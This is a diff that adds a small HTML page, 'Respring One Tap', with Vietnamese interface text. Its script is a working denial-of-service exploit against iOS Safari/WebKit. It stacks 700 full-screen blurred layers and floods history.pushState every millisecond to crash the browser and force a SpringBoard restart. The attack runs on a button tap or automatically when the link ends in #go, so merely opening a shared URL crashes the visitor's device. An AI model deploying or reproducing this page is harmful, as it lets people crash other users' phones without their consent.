@@ -1,0 +1,65 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+  <title>Respring One Tap</title>
+  <style>
+    html, body {height:100%;margin:0;background:#090a0d;color:#fff;font-family:-apple-system,BlinkMacSystemFont,Arial,sans-serif}
+    body {display:flex;align-items:center;justify-content:center;text-align:center}
+    main {padding:24px;max-width:380px}
+    button {background:#f04747;color:#fff;border:0;border-radius:15px;font-size:18px;font-weight:700;padding:18px 28px;cursor:pointer}
+    p {color:#aaa;font-size:14px;line-height:1.5}
+  </style>
+</head>
+<body>
+  <main>
+    <button id="run" type="button">Restart SpringBoard</button>
+    <p id="status">Chỉ tự chạy khi mở URL kết thúc bằng #go.</p>
+  </main>
+  <script>
+    (function () {
+      const button = document.getElementById('run');
+      const status = document.getElementById('status');
+      const intervalMs = 1;
+      const cooldownMs = 60000;
+      const storageKey = 'respring-one-tap-last-start';
+      let started = false;
+
+      function start() {
+        if (started) return;
+        started = true;
+        status.textContent = 'Đang thực hiện respring...';
+        button.disabled = true;
+        for (let i = 0; i < 700; i++) {
+          const layer = document.createElement('div');
+          layer.style.cssText = 'position:fixed;width:100vw;height:100vh;' +
+            'backdrop-filter:blur(180px);-webkit-backdrop-filter:blur(180px);' +
+            'opacity:0.95;z-index:' + (9999 + i) + ';' +
+            'transform:translate3d(' + i + 'px,' + i + 'px,' + i + 'px);';
+          document.body.appendChild(layer);
+        }
+        setInterval(function () {
+          window.history.pushState(null, '', window.location.href);
+        }, intervalMs);
+      }
+
+      button.addEventListener('click', start);
+
+      if (location.hash === '#go') {
+        // Remove the auto-run trigger first, so Safari's session restore won't retrigger it.
+        history.replaceState(null, '', location.pathname + location.search);
+        let previous = 0;
+        try { previous = Number(localStorage.getItem(storageKey) || 0); } catch (e) {}
+        if (Date.now() - previous < cooldownMs) {
+          status.textContent = 'Đã kích hoạt gần đây. Để tránh lặp, hãy chờ một phút hoặc nhấn nút thủ công.';
+        } else {
+          try { localStorage.setItem(storageKey, String(Date.now())); } catch (e) {}
+          // Give the page one frame to become visible before stressing WebKit.
+          requestAnimationFrame(start);
+        }
+      }
+    }());
+  </script>
+</body>
+</html>
